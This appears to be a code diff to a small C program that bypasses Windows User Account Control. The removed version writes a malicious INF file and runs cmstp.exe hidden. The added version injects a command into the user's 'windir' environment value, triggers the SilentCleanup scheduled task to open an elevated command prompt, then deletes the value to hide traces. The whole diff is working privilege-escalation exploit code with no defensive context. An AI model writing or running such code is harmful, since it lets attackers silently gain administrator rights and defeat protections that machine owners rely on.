@@ -2,24 +2,27 @@
 #include <stdio.h>
 
 int main() {
-    // Simple PEB masquerade + CMSTPLUA
-    const char* payload = "cmd.exe /c \"whoami > C:\\elevated_success.txt & echo UAC BYPASSED VIA PEB CMSTPLUA 2026 > C:\\uac_bypassed.txt & timeout 10\"";
+    // Payload: Open elevated Command Prompt (admin cmd.exe)
+    const char* payload = "cmd.exe\" /c \"start \"\" \"cmd.exe\" & echo UAC BYPASSED - ADMIN CMD OPENED ON 25H2 > C:\\uac_success.txt\"";
 
-    // Create INF
-    system("mkdir C:\\temp 2>nul");
-    FILE *f = fopen("C:\\temp\\bypass.inf", "w");
-    if (f) {
-        fprintf(f, "[version]\r\nSignature=$chicago$\r\nAdvancedINF=2.5\r\n\r\n[DefaultInstall]\r\nCustomDestination=CustInstDestSectionAllUsers\r\nRunPreSetupCommands=RunPreSetupCommandsSection\r\n\r\n[RunPreSetupCommandsSection]\r\n%s\r\n\r\n[CustInstDestSectionAllUsers]\r\n49000,49001=AllUSer_LDIDSection, 7\r\n\r\n[AllUSer_LDIDSection]\r\n\"HKLM\", \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE\", \"ProfileInstallPath\", \"%%UnexpectedError%%\", \"\"\r\n\r\n[Strings]\r\nServiceName=\"CMSTPLUA\"\r\n", payload);
-        fclose(f);
+    HKEY hKey;
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Environment", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        RegSetValueExA(hKey, "windir", 0, REG_EXPAND_SZ, (const BYTE*)payload, (DWORD)strlen(payload) + 1);
+        RegCloseKey(hKey);
     }
 
-    // Trigger with basic PEB spoof attempt via parent process
-    ShellExecuteA(NULL, "open", "C:\\Windows\\System32\\cmstp.exe", "/s C:\\temp\\bypass.inf", NULL, SW_HIDE);
+    // Trigger SilentCleanup task
+    system("schtasks /run /tn \"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup\" /I");
 
-    Sleep(12000);
+    Sleep(15000);  // Give 25H2 time to run the task
 
-    DeleteFileA("C:\\temp\\bypass.inf");
+    // Cleanup
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Environment", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        RegDeleteValueA(hKey, "windir");
+        RegCloseKey(hKey);
+    }
 
-    printf("[+] PEB CMSTPLUA triggered. Check C:\\ files.\n");
+    printf("[+] Trigger sent. An admin Command Prompt should open if successful.\n");
+    printf("Also check C:\\uac_success.txt for confirmation.\n");
     return 0;
 }
